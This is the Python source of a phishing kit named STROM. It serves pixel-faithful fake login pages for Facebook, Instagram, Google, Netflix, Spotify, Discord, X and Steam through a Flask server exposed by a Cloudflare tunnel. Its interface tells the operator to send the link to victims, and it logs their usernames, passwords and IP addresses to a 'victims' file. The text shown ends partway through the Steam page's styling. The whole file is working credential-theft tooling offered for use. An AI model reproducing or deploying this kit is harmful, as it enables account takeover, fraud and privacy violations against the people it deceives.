#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import threading
import socket
import re
import signal
from datetime import datetime

try:
    import requests
except ImportError:
    print("[!] 'requests' modulu eksik. Kurulum: pip install requests")
    sys.exit(1)

try:
    from flask import Flask, request, render_template_string, redirect
except ImportError:
    print("[!] 'flask' modulu eksik. Kurulum: pip install flask")
    sys.exit(1)

app = Flask(__name__)

ACCENT = '\033[96m'
BOLD = '\033[1m'
WHITE = '\033[97m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
RED = '\033[91m'
CYAN = '\033[96m'
RESET = '\033[0m'

HOST = '127.0.0.1'
PORT = 8080
TUNNEL_URL = None
TUNNEL_PROCESS = None
LOGS_FILE = 'auth/kurbanlar.txt'
current_site = 'facebook'
flask_thread_started = False
shutdown_event = threading.Event()

LANG = 'tr'

TEXTS = {
    'tr': {
        'menu_title': '𝐒𝐓𝐑𝐎𝐌',
        'telegram': 'Telegram: @turkiyebenim',
        'kanal': 'Kanal: @turkiyebenim',
        'exit': 'Çıkış',
        'victims': 'Kurbanları Gör',
        'choice': 'Seçiminiz',
        'selected': 'seçildi!',
        'server_start': 'Sunucu başlatılıyor...',
        'server_running': 'Sunucu zaten çalışıyor...',
        'tunnel_start': 'Cloudflare Tunnel başlatılıyor...',
        'tunnel_attempt': 'Deneme',
        'installing': 'Cloudflared kuruluyor...',
        'install_fail': 'Cloudflared kurulamadı!',
        'url_fail': 'Tunnel URL alınamadı, tekrar deneniyor...',
        'tunnel_err': 'Tunnel hatası:',
        'active': '✅ PHISHING SAYFASI AKTIF!',
        'link': '🔗 LINK:',
        'short': '📎 KISALTILMIŞ:',
        'send': 'Linki kurbana gönder, bilgileri gelsin!',
        'back_hint': "Ana menüye dönmek için 'm' yaz",
        'stop_hint': '⛔ CTRL+C ile durdur',
        'tunnel_fail': '❌ Tunnel bağlantısı başarısız!',
        'manual': 'adresini manuel kullan',
        'back': 'Ana menüye dönülüyor...',
        'stopping': 'Sunucu durduruluyor...',
        'invalid': '❌ Geçersiz seçim!',
        'no_victim': 'Henüz kurban yok.',
        'victim_list': '📊 KURBAN LİSTESİ',
        'clear_prompt': '0=listeyi temizle, m=ana menü',
        'cleared': '✅ Kurban listesi temizlendi!',
        'empty': 'Zaten boş.',
        'error': '❌ Hata:',
        'new_victim': '🎯 YENİ KURBAN!',
        'site_l': '📱 Site:',
        'user_l': '👤 Kullanıcı:',
        'pass_l': '🔑 Şifre:',
        'ip_l': '🌐 IP:',
        'date_l': '⏰ Tarih:',
        'save_err': 'Kayıt hatası:',
        'flask_err': 'Flask başlatma hatası:',
        'stopped': 'Program Durduruldu.',
        'exit_msg': '𝐒𝐓𝐑𝐎𝐌 kapatıldı!',
        'lang_select': 'Dil Seçin / Select Language / اختر اللغة',
        'lang_invalid': 'Geçersiz seçim!',
    },
    'en': {
        'menu_title': '𝐒𝐓𝐑𝐎𝐌',
        'telegram': 'Telegram: @turkiyebenim',
        'kanal': 'Channel: @turkiyebenim',
        'exit': 'Exit',
        'victims': 'View Victims',
        'choice': 'Your choice',
        'selected': 'selected!',
        'server_start': 'Starting server...',
        'server_running': 'Server already running...',
        'tunnel_start': 'Starting Cloudflare Tunnel...',
        'tunnel_attempt': 'Attempt',
        'installing': 'Installing Cloudflared...',
        'install_fail': 'Cloudflared could not be installed!',
        'url_fail': 'Tunnel URL not received, retrying...',
        'tunnel_err': 'Tunnel error:',
        'active': '✅ PHISHING PAGE ACTIVE!',
        'link': '🔗 LINK:',
        'short': '📎 SHORTENED:',
        'send': 'Send the link to the victim, wait for credentials!',
        'back_hint': "Type 'm' to return to main menu",
        'stop_hint': '⛔ Press CTRL+C to stop',
        'tunnel_fail': '❌ Tunnel connection failed!',
        'manual': 'use address manually',
        'back': 'Returning to main menu...',
        'stopping': 'Stopping server...',
        'invalid': '❌ Invalid choice!',
        'no_victim': 'No victims yet.',
        'victim_list': '📊 VICTIM LIST',
        'clear_prompt': '0=clear list, m=main menu',
        'cleared': '✅ Victim list cleared!',
        'empty': 'Already empty.',
        'error': '❌ Error:',
        'new_victim': '🎯 NEW VICTIM!',
        'site_l': '📱 Site:',
        'user_l': '👤 Username:',
        'pass_l': '🔑 Password:',
        'ip_l': '🌐 IP:',
        'date_l': '⏰ Date:',
        'save_err': 'Save error:',
        'flask_err': 'Flask start error:',
        'stopped': 'Program stopped.',
        'exit_msg': '𝐒𝐓𝐑𝐎𝐌 closed!',
        'lang_select': 'Dil Seçin / Select Language / اختر اللغة',
        'lang_invalid': 'Invalid choice!',
    },
    'ar': {
        'menu_title': '𝐒𝐓𝐑𝐎𝐌',
        'telegram': 'تيليجرام: @turkiyebenim',
        'kanal': 'القناة: @turkiyebenim',
        'exit': 'خروج',
        'victims': 'عرض الضحايا',
        'choice': 'اختيارك',
        'selected': 'تم الاختيار!',
        'server_start': 'جارٍ تشغيل الخادم...',
        'server_running': 'الخادم يعمل بالفعل...',
        'tunnel_start': 'جارٍ تشغيل Cloudflare Tunnel...',
        'tunnel_attempt': 'محاولة',
        'installing': 'جارٍ تثبيت Cloudflared...',
        'install_fail': 'تعذر تثبيت Cloudflared!',
        'url_fail': 'لم يتم استلام رابط النفق، إعادة المحاولة...',
        'tunnel_err': 'خطأ في النفق:',
        'active': '✅ صفحة التصيد نشطة!',
        'link': '🔗 الرابط:',
        'short': '📎 رابط مختصر:',
        'send': 'أرسل الرابط إلى الضحية وانتظر البيانات!',
        'back_hint': "اكتب 'm' للعودة إلى القائمة الرئيسية",
        'stop_hint': '⛔ اضغط CTRL+C للإيقاف',
        'tunnel_fail': '❌ فشل اتصال النفق!',
        'manual': 'استخدم العنوان يدويًا',
        'back': 'العودة إلى القائمة الرئيسية...',
        'stopping': 'جارٍ إيقاف الخادم...',
        'invalid': '❌ اختيار غير صالح!',
        'no_victim': 'لا يوجد ضحايا بعد.',
        'victim_list': '📊 قائمة الضحايا',
        'clear_prompt': '0=مسح القائمة، m=القائمة الرئيسية',
        'cleared': '✅ تم مسح قائمة الضحايا!',
        'empty': 'فارغة بالفعل.',
        'error': '❌ خطأ:',
        'new_victim': '🎯 ضحية جديدة!',
        'site_l': '📱 الموقع:',
        'user_l': '👤 اسم المستخدم:',
        'pass_l': '🔑 كلمة المرور:',
        'ip_l': '🌐 IP:',
        'date_l': '⏰ التاريخ:',
        'save_err': 'خطأ في الحفظ:',
        'flask_err': 'خطأ في تشغيل Flask:',
        'stopped': 'تم إيقاف البرنامج.',
        'exit_msg': 'تم إغلاق 𝐒𝐓𝐑𝐎𝐌!',
        'lang_select': 'Dil Seçin / Select Language / اختر اللغة',
        'lang_invalid': 'اختيار غير صالح!',
    }
}

def T(key):
    return TEXTS[LANG].get(key, key)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def select_language():
    global LANG
    while True:
        clear()
        print(f"""
{ACCENT}{BOLD}══════════════════════════════════════════════════════{RESET}
{WHITE}{BOLD}       {TEXTS['tr']['lang_select']}{RESET}
{ACCENT}{BOLD}══════════════════════════════════════════════════════{RESET}

   {GREEN}[1]{RESET} Türkçe
   {GREEN}[2]{RESET} English
   {GREEN}[3]{RESET} العربية

{WHITE}══════════════════════════════════════════════════════{RESET}
""")
        try:
            secim = input(f"{CYAN}[?] {TEXTS['tr']['choice']}: {RESET}").strip()
        except (EOFError, KeyboardInterrupt):
            sys.exit(0)
        if secim == '1':
            LANG = 'tr'
            return
        elif secim == '2':
            LANG = 'en'
            return
        elif secim == '3':
            LANG = 'ar'
            return
        else:
            print(f"{RED}{TEXTS['tr']['lang_invalid']}{RESET}")
            time.sleep(1)

def cleanup():
    global TUNNEL_PROCESS
    if TUNNEL_PROCESS:
        try:
            TUNNEL_PROCESS.terminate()
            TUNNEL_PROCESS.wait(timeout=3)
        except Exception:
            pass
        TUNNEL_PROCESS = None

def signal_handler(sig, frame):
    print(f"\n{RED}[!] {T('stopped')}{RESET}")
    shutdown_event.set()
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ==================== GERÇEKÇİ HTML TEMPLATES ====================

BASE_STYLE = """
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
body{min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;animation:fadeIn .3s ease}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
input:invalid{animation:shake .3s}
a{text-decoration:none;color:inherit}
button{cursor:pointer;font-family:inherit;transition:all .15s ease}
button:active{transform:scale(.98)}
"""

FB_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook'a Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:#f0f2f5;flex-direction:column;gap:20px}
.header{width:100%;max-width:980px;display:flex;align-items:center;gap:10px;justify-content:center;margin-bottom:20px}
.fb-logo{width:56px;height:56px}
.brand{font-size:28px;font-weight:800;color:#1877F2;letter-spacing:-.5px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:100%;max-width:396px}
.title{font-size:20px;font-weight:600;color:#1c1e21;text-align:center;margin-bottom:16px}
.field{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;background:#fff;outline:none}
.field:focus{border-color:#1877F2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.btn{width:100%;padding:14px;background:#1877F2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;margin-top:4px}
.btn:hover{background:#166fe5}
.forgot{display:block;text-align:center;color:#1877F2;font-size:14px;margin:16px 0}
.forgot:hover{text-decoration:underline}
.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#96999e;font-size:13px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dadde1}
.new-btn{display:block;width:fit-content;margin:0 auto;padding:14px 20px;background:#42b72a;color:#fff;border-radius:6px;font-size:17px;font-weight:700}
.new-btn:hover{background:#36a420}
.meta{position:fixed;bottom:20px;left:0;right:0;text-align:center;color:#737373;font-size:12px;line-height:1.5}
.meta b{color:#1c1e21}
</style></head>
<body>
<div class="header">
<svg class="fb-logo" viewBox="0 0 36 36" fill="#1877F2"><path d="M36 18C36 8.06 27.94 0 18 0S0 8.06 0 18c0 8.98 6.58 16.42 15.19 17.78V23.2h-4.57V18h4.57v-3.97c0-4.51 2.69-7 6.8-7 1.97 0 4.03.35 4.03.35v4.43h-2.27c-2.24 0-2.94 1.39-2.94 2.82V18h5l-.8 5.2h-4.2v12.58C29.42 34.42 36 26.98 36 18z"/></svg>
<span class="brand">facebook</span>
</div>
<div class="card">
<div class="title">Facebook'a Giriş Yap</div>
<form method="POST" action="/login/facebook" autocomplete="on">
<input class="field" type="text" name="username" placeholder="E-posta veya telefon numarası" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<button class="btn" type="submit">Giriş Yap</button>
</form>
<a class="forgot" href="#">Şifreni mi unuttun?</a>
<div class="divider">veya</div>
<a class="new-btn" href="#">Yeni Hesap Oluştur</a>
</div>
<div class="meta"><b>Meta</b> © 2024 &nbsp;·&nbsp; Türkçe &nbsp;·&nbsp; Gizlilik &nbsp;·&nbsp; Şartlar &nbsp;·&nbsp; Çerezler</div>
</body></html>"""

IG_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram</title>
<style>""" + BASE_STYLE + """
body{background:#fafafa;flex-direction:column;gap:14px}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;width:100%;max-width:350px;text-align:center}
.ig-logo{width:175px;height:51px;margin:0 auto 30px;display:block}
.field{width:100%;padding:10px 12px;margin-bottom:6px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:14px;outline:none}
.field:focus{border-color:#a8a8a8;background:#fff}
.btn{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;margin-top:8px}
.btn:hover{background:#1877f2}
.divider{display:flex;align-items:center;gap:15px;margin:20px 0;color:#8e8e8e;font-size:13px;font-weight:600}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.fb-login{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-size:14px;font-weight:600;margin:16px 0}
.fb-login svg{width:16px;height:16px}
.forgot{color:#00376b;font-size:12px;display:block;margin-top:12px}
.signup-card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px;width:100%;max-width:350px;text-align:center;font-size:14px}
.signup-card a{color:#0095f6;font-weight:600}
.apps{text-align:center;font-size:14px;color:#262626;margin-top:10px}
.stores{display:flex;gap:8px;justify-content:center;margin-top:12px}
.store{background:#000;color:#fff;padding:6px 12px;border-radius:5px;font-size:11px;display:flex;align-items:center;gap:4px}
</style></head>
<body>
<div class="card">
<svg class="ig-logo" viewBox="0 0 175 51"><text x="0" y="38" font-family="'Billabong','Brush Script MT',cursive" font-size="42" fill="#262626">Instagram</text></svg>
<form method="POST" action="/login/instagram">
<input class="field" type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<button class="btn" type="submit">Giriş yap</button>
</form>
<div class="divider">VEYA</div>
<a class="fb-login" href="#">
<svg viewBox="0 0 24 24" fill="#385185"><path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.09 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.97h-1.51c-1.49 0-1.96.93-1.96 1.89v2.25h3.33l-.53 3.49h-2.8V24C19.61 23.09 24 18.1 24 12.07z"/></svg>
Facebook ile giriş yap
</a>
<a class="forgot" href="#">Şifreni mi unuttun?</a>
</div>
<div class="signup-card">Hesabın yok mu? <a href="#">Kaydol</a></div>
<div class="apps">Uygulamayı indir.<div class="stores"><div class="store">📱 App Store</div><div class="store">▶ Google Play</div></div></div>
</body></html>"""

GOOGLE_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Oturum açın - Google Hesapları</title>
<style>""" + BASE_STYLE + """
body{background:#fff;flex-direction:column}
.card{width:100%;max-width:448px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}
.logo-wrap{text-align:center;margin-bottom:16px}
.title{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
.subtitle{font-size:16px;color:#202124;text-align:center;margin-bottom:32px}
.field-wrap{position:relative;margin-bottom:16px}
.field{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;background:#fff}
.field:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:32px;gap:16px}
.link{color:#1a73e8;font-size:14px;font-weight:500;padding:8px 4px;border-radius:4px}
.link:hover{background:#f6fafe}
.btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500}
.btn:hover{background:#1765cc}
.footer{display:flex;justify-content:space-between;width:100%;max-width:448px;margin-top:24px;font-size:12px;color:#5f6368}
.footer select{border:none;background:transparent;color:#5f6368;font-size:12px;padding:4px}
.footer-links{display:flex;gap:24px}
</style></head>
<body>
<div class="card">
<div class="logo-wrap">
<svg width="75" height="24" viewBox="0 0 75 24"><path fill="#4285F4" d="M12 10.2v3.6h5c-.2 1.3-1.5 3.8-5 3.8-3 0-5.4-2.5-5.4-5.5S9 6.6 12 6.6c1.7 0 2.9.7 3.5 1.4l2.4-2.3C16.3 4.2 14.4 3.2 12 3.2 6.9 3.2 2.8 7.3 2.8 12.4S6.9 21.6 12 21.6c6.9 0 11.5-4.9 11.5-11.7 0-.8-.1-1.4-.2-2H12z"/><text x="28" y="17" font-family="'Product Sans',Arial,sans-serif" font-size="15" fill="#5f6368">Google</text></svg>
</div>
<div class="title">Oturum açın</div>
<div class="subtitle">Devam etmek için Google Hesabınızı kullanın</div>
<form method="POST" action="/login/google">
<div class="field-wrap"><input class="field" type="text" name="username" placeholder="E-posta veya telefon" required autofocus></div>
<div class="field-wrap"><input class="field" type="password" name="password" placeholder="Şifrenizi girin" required></div>
<div class="actions">
<a class="link" href="#">Hesap oluştur</a>
<button class="btn" type="submit">İleri</button>
</div>
</form>
</div>
<div class="footer"><select><option>Türkçe (Türkiye)</option></select><div class="footer-links"><a href="#">Yardım</a><a href="#">Gizlilik</a><a href="#">Şartlar</a></div></div>
</body></html>"""

NETFLIX_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Netflix - Oturum Aç</title>
<style>""" + BASE_STYLE + """
body{background:#000;flex-direction:column}
.topbar{position:absolute;top:20px;left:40px;right:40px;display:flex;justify-content:space-between;align-items:center}
.nf-logo{font-size:32px;font-weight:900;color:#E50914;letter-spacing:-2px;text-shadow:0 2px 4px rgba(0,0,0,.5)}
.card{background:rgba(0,0,0,.75);backdrop-filter:blur(8px);padding:60px 68px 40px;border-radius:4px;width:100%;max-width:450px;position:relative}
.title{font-size:32px;font-weight:700;color:#fff;margin-bottom:28px}
.field{width:100%;padding:16px 20px;margin-bottom:16px;border:none;border-radius:4px;background:#333;color:#fff;font-size:16px;outline:none}
.field:focus{background:#454545}
.field::placeholder{color:#8c8c8c}
.btn{width:100%;padding:16px;background:#E50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;margin-top:24px}
.btn:hover{background:#f40612}
.help{display:flex;justify-content:space-between;margin-top:12px;font-size:13px;color:#b3b3b3}
.help label{display:flex;align-items:center;gap:4px}
.help input[type=checkbox]{accent-color:#737373;width:14px}
.help a{color:#b3b3b3}
.signup{margin-top:60px;color:#737373;font-size:16px}
.signup a{color:#fff;font-weight:500;margin-left:4px}
.recaptcha{margin-top:16px;font-size:11px;color:#8c8c8c;line-height:1.4}
.recaptcha a{color:#0071eb}
</style></head>
<body>
<div class="topbar"><div class="nf-logo">NETFLIX</div></div>
<div class="card">
<div class="title">Oturum Aç</div>
<form method="POST" action="/login/netflix">
<input class="field" type="text" name="username" placeholder="E-posta veya telefon numarası" required autofocus>
<input class="field" type="password" name="password" placeholder="Parola" required>
<button class="btn" type="submit">Oturum Aç</button>
<div class="help"><label><input type="checkbox" checked> Beni hatırla</label><a href="#">Yardım mı gerekiyor?</a></div>
</form>
<div class="signup">Netflix'e yeni misiniz? <a href="#">Şimdi kaydolun.</a></div>
<div class="recaptcha">Bu sayfa, Google tarafından <a href="#">reCAPTCHA</a> ile korunmaktadır. <a href="#">Gizlilik</a> - <a href="#">Şartlar</a></div>
</div>
</body></html>"""

SPOTIFY_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Spotify - Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:linear-gradient(180deg,#1a1a1a 0%,#000 100%);flex-direction:column;padding:0}
.header{width:100%;padding:32px 48px;display:flex;align-items:center;gap:8px}
.sp-logo{width:40px;height:40px}
.brand{font-size:22px;font-weight:700;color:#fff;letter-spacing:-.5px}
.main{flex:1;display:flex;justify-content:center;align-items:center;width:100%;padding:20px}
.card{background:#121212;border-radius:8px;padding:48px 40px;width:100%;max-width:450px;box-shadow:0 8px 24px rgba(0,0,0,.5)}
.title{font-size:32px;font-weight:700;color:#fff;text-align:center;margin-bottom:8px}
.subtitle{font-size:14px;color:#b3b3b3;text-align:center;margin-bottom:32px}
.label{display:block;font-size:14px;font-weight:700;color:#fff;margin-bottom:8px}
.field{width:100%;padding:14px;margin-bottom:20px;border:1px solid #878787;border-radius:4px;background:#121212;color:#fff;font-size:16px;outline:none}
.field:focus{border-color:#fff}
.btn{width:100%;padding:14px;background:#1ed760;color:#000;border:none;border-radius:500px;font-size:16px;font-weight:700;margin:8px 0 20px}
.btn:hover{background:#1fdf64}
.divider{display:flex;align-items:center;gap:16px;margin:20px 0;color:#a7a7a7;font-size:13px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#333}
.social-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:12px;background:transparent;color:#fff;border:1px solid #878787;border-radius:500px;font-size:14px;font-weight:700;margin-bottom:10px}
.forgot{display:block;text-align:center;color:#fff;font-size:14px;text-decoration:underline;margin-top:16px}
.footer{color:#a7a7a7;font-size:14px;text-align:center;margin-top:32px}
.footer a{color:#fff;text-decoration:underline}
</style></head>
<body>
<div class="header">
<svg class="sp-logo" viewBox="0 0 168 168" fill="#1ed760"><path d="M84 0C37.6 0 0 37.6 0 84s37.6 84 84 84 84-37.6 84-84S130.4 0 84 0zm38.5 121.1c-1.5 2.5-4.7 3.2-7.2 1.7-19.7-12-44.5-14.8-73.7-8.1-2.8.6-5.6-1.1-6.3-3.9-.6-2.8 1.1-5.6 3.9-6.3 31.9-7.3 59.3-4.2 81.4 9.4 2.5 1.5 3.3 4.7 1.9 7.2zm10.3-22.9c-1.9 3.1-5.9 4-9 2.2-22.6-13.9-57-17.9-83.7-9.8-3.5 1-7.1-.9-8.2-4.4-1-3.5.9-7.1 4.4-8.2 30.5-9.2 68.4-4.8 94.3 11.1 3.1 1.9 4 5.9 2.2 9.1zm.9-23.9c-27.1-16.1-71.7-17.6-97.6-9.7-4.2 1.3-8.6-1.1-9.9-5.3-1.3-4.2 1.1-8.6 5.3-9.9 29.7-9 79.1-7.3 110.3 11.3 3.8 2.2 5 7.1 2.8 10.8-2.2 3.8-7 5-10.9 2.8z"/></svg>
<span class="brand">Spotify</span>
</div>
<div class="main"><div class="card">
<div class="title">Spotify'da oturum aç</div>
<div class="subtitle">Müziğin keyfini çıkarmaya devam et</div>
<form method="POST" action="/login/spotify">
<label class="label">E-posta adresi</label>
<input class="field" type="text" name="username" placeholder="E-posta adresi" required autofocus>
<label class="label">Şifre</label>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<button class="btn" type="submit">Oturum Aç</button>
</form>
<a class="forgot" href="#">Şifreni mi unuttun?</a>
<div class="divider">veya</div>
<button class="social-btn">📱 Telefon numarasıyla devam et</button>
<button class="social-btn">🍎 Apple ile devam et</button>
<button class="social-btn">🔵 Google ile devam et</button>
<button class="social-btn">📘 Facebook ile devam et</button>
<div class="footer">Hesabın yok mu? <a href="#">Kaydol</a></div>
</div></div>
</body></html>"""

DISCORD_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Discord - Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:#313338;flex-direction:column}
.card{background:#313338;border-radius:8px;padding:32px;width:100%;max-width:480px;box-shadow:0 2px 10px rgba(0,0,0,.2)}
.logo-wrap{text-align:center;margin-bottom:24px}
.title{font-size:24px;font-weight:600;color:#f2f3f5;text-align:center;margin-bottom:8px}
.subtitle{font-size:16px;color:#b5bac1;text-align:center;margin-bottom:24px}
.label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:.02em;margin-bottom:8px}
.label .req{color:#f23f43;margin-left:2px}
.field{width:100%;padding:10px;margin-bottom:20px;border:none;border-radius:3px;background:#1e1f22;color:#dbdee1;font-size:16px;outline:none}
.field:focus{outline:2px solid #5865F2}
.link{color:#00a8fc;font-size:14px;display:block;margin-bottom:20px}
.btn{width:100%;padding:12px;background:#5865F2;color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:600;margin-top:8px}
.btn:hover{background:#4752c4}
.register{font-size:14px;color:#949ba4;margin-top:16px}
.register a{color:#00a8fc}
.help{position:fixed;bottom:20px;right:20px;background:#5865F2;color:#fff;padding:8px 12px;border-radius:4px;font-size:13px}
</style></head>
<body>
<div class="card">
<div class="logo-wrap">
<svg width="60" height="60" viewBox="0 0 71 55" fill="#5865F2"><path d="M60.1 4.9A58.5 58.5 0 0 0 45.4.2a40.6 40.6 0 0 0-1.8 3.8 54 54 0 0 0-16.2 0A40.6 40.6 0 0 0 25.6.2a58.4 58.4 0 0 0-14.7 4.7C1.5 20.6-1 35.8 1 50.7a59 59 0 0 0 18 9 42 42 0 0 0 3.7-6 38.3 38.3 0 0 1-5.9-2.8l1.4-1.1a41.9 41.9 0 0 0 35.6 0l1.4 1.1a38.3 38.3 0 0 1-5.9 2.8 42 42 0 0 0 3.7 6 59 59 0 0 0 18-9c2.4-17.4-1.4-32.4-5.9-45.8zM23.7 41.5c-3.5 0-6.4-3.2-6.4-7.1s2.8-7.1 6.4-7.1 6.5 3.2 6.4 7.1c0 3.9-2.8 7.1-6.4 7.1zm23.6 0c-3.5 0-6.4-3.2-6.4-7.1s2.8-7.1 6.4-7.1 6.5 3.2 6.4 7.1c0 3.9-2.8 7.1-6.4 7.1z"/></svg>
</div>
<div class="title">Tekrar hoş geldin!</div>
<div class="subtitle">Seni tekrar görmek çok güzel!</div>
<form method="POST" action="/login/discord">
<label class="label">E-posta veya telefon numarası<span class="req">*</span></label>
<input class="field" type="text" name="username" required autofocus>
<label class="label">Şifre<span class="req">*</span></label>
<input class="field" type="password" name="password" required>
<a class="link" href="#">Şifreni mi unuttun?</a>
<button class="btn" type="submit">Giriş Yap</button>
</form>
<div class="register">Bir hesaba mı ihtiyacın var? <a href="#">Kayıt ol</a></div>
</div>
<div class="help">💬 Yardım</div>
</body></html>"""

TWITTER_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>X. Şu anda olup bitenler</title>
<style>""" + BASE_STYLE + """
body{background:#000;flex-direction:column;color:#e7e9ea}
.card{width:100%;max-width:440px;padding:32px}
.logo{width:40px;height:40px;margin-bottom:32px;display:block}
.title{font-size:31px;font-weight:700;margin-bottom:32px;color:#e7e9ea}
.field{width:100%;padding:12px;margin-bottom:16px;border:1px solid #333;border-radius:4px;background:#000;color:#e7e9ea;font-size:15px;outline:none}
.field:focus{border-color:#1d9bf0}
.btn{width:100%;padding:12px;background:#e7e9ea;color:#000;border:none;border-radius:9999px;font-size:15px;font-weight:700;margin-top:8px}
.btn:hover{background:#d7dbdc}
.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#71767b;font-size:14px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#333}
.signin{width:100%;padding:12px;background:transparent;color:#1d9bf0;border:1px solid #536471;border-radius:9999px;font-size:15px;font-weight:700}
.forgot{color:#1d9bf0;font-size:14px;display:block;margin-top:16px}
.terms{font-size:11px;color:#71767b;margin-top:32px;line-height:1.5}
.terms a{color:#1d9bf0}
.footer{position:fixed;bottom:16px;left:0;right:0;text-align:center;font-size:13px;color:#71767b}
.footer a{color:#71767b;margin:0 8px}
</style></head>
<body>
<svg class="logo" viewBox="0 0 24 24" fill="#e7e9ea"><path d="M18.9 1.2h3.7l-8 9.1L24 22.8h-7.4l-5.8-7.6-6.6 7.6H.5l8.5-9.8L0 1.2h7.6l5.2 6.9 6.1-6.9zm-1.3 19.4h2L6.5 3.3H4.4l13.2 17.3z"/></svg>
<div class="title">Şu anda olup bitenler</div>
<div class="card">
<form method="POST" action="/login/twitter">
<input class="field" type="text" name="username" placeholder="Telefon, e-posta veya kullanıcı adı" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<button class="btn" type="submit">Giriş yap</button>
</form>
<a class="forgot" href="#">Şifreni mi unuttun?</a>
<div class="divider">veya</div>
<button class="signin">Google ile Giriş Yap</button>
<button class="signin" style="margin-top:12px">Apple ile Giriş Yap</button>
<div class="terms">Hesabın yok mu? <a href="#">Kaydol</a></div>
</div>
<div class="footer"><a href="#">Hakkında</a><a href="#">Yardım Merkezi</a><a href="#">Şartlar</a><a href="#">Gizlilik</a><a href="#">© 2024 X Corp.</a></div>
</body></html>"""

STEAM_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Steam - Giriş</title>
<style>""" + BASE_STYLE + """
body{background:#1b2838;background-image:radial-gradient(ellipse at top,#2a475e 0%,#1b2838 60%);flex-direction:column;padding:20px}
.topbar{position:absolute;top:20px;left:40px;display:flex;align-items:center;gap:10px}
.steam-logo{width:40px;height:40px}
.brand{font-size:24px;font-weight:400;color:#c7d5e0;letter-spacing:1px}
.card{background:rgba(23,33,44,.95);border:1px solid #2a475e;border-radius:4px;padding:40px;width:100%;max-width:400px;box-shadow:0 10px 30px rgba(0,0,0,.5)}
.title{font-size:22px;color:#fff;font-weight:400;margin-bottom:8px;letter-spacing:.5px}
.subtitle{font-size:13px;color:#85949f;margin-bottom:24px}
.field{width:100%;padding:12px;margin-bottom:16px;border:1px solid #2a475e;border-radius:3px;background:#16212d;color:#c6d4df;font-size:15px;outline:none}
.field:focus{border-color:#66c0f4}
.btn{width:100%;padding:12px;background:linear-gradient(180deg,#67c1f5,#417a9b);color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:500;margin-top:8px}
.checkbox{display:flex;align-items:center;gap:8px;color:#85949f;font-size:13px;margin:8px 0 16px}
.checkbox input{accent-color:#67c1f5;width:14px;height:14px}
.link{color:#67c1f5;font-size:13px;display:block;margin-top:12px}
